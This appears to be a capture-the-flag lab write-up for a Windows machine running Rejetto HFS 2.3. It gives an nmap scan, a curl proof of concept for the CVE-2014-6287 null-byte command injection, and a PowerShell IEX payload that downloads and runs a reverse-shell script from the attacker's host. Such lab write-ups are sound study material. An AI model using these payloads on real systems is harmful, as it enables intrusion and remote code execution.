# optimum

## services
```bash

# Nmap 7.94 scan initiated Thu Jun 15 18:48:55 2023 as: nmap -sC -sV -p 80 -o nmap/tcp-script 10.129.51.65
Nmap scan report for 10.129.51.65
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 15 18:49:08 2023 -- 1 IP address (1 host up) scanned in 12.15 seconds
```
The only service runnings an http file server on port 80 and its a Rejetto 2.3 which is vulnerable to command injection in the search parameter.

## CVE-2014-6287 Http File Server 2.3.x

This vulnerability allows RCE by injecting a NULL byte into the search parameter of a GET request to the server. 

Exploits can be found on exploit-db, but its a fairly straight forward injection, so a script is not necessary.

The null byte bypasses filtering in HFS and allows you to execute arbitrary code in the HFS scripting language. 
```bash
└─$ curl 10.129.175.73 -G -d "search=%00{{.exec+|+cmd.exe+/c+ping+/n+1+10.10.14.6.}}"
```
This curl command can be used as a POC for this exploit.
```bash
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:12:32.883145 IP 10.129.175.73 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 40
07:12:32.883166 IP 10.10.14.6 > 10.129.175.73: ICMP echo reply, id 1, seq 1, length 40
07:12:32.884637 IP 10.129.175.73 > 10.10.14.6: ICMP echo request, id 1, seq 2, length 40
07:12:32.884645 IP 10.10.14.6 > 10.129.175.73: ICMP echo reply, id 1, seq 2, length 40
07:12:32.884651 IP 10.129.175.73 > 10.10.14.6: ICMP echo request, id 1, seq 3, length 40
07:12:32.884652 IP 10.10.14.6 > 10.129.175.73: ICMP echo reply, id 1, seq 3, length 40
07:12:32.884847 IP 10.129.175.73 > 10.10.14.6: ICMP echo request, id 1, seq 4, length 40
07:12:32.884849 IP 10.10.14.6 > 10.129.175.73: ICMP echo reply, id 1, seq 4, length 40
```
The command gets executed 4 times on the server even though we specified only 1 ping.

Shell payload:
```bash
http://10.129.175.73:80/?search=%00{.+exec|powershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.6%3A8888/reverseShell.ps1%27%29.}
```
This payload is is using the IEX powershell cmdlet which runs the commands in the string passed to it. The rest of the payload downloads the script from my machine and passes it to IEX.

## privEsc - Administrator

I was unable to get winPEAS.exe to run on the target and I am not well versed in windows privEsc, so I had to use metasploits hfs module to get Root.

After getting initial access with metasploit, I ran exploit suggester and then went through the suggested exploits until I eventually got a root shell.


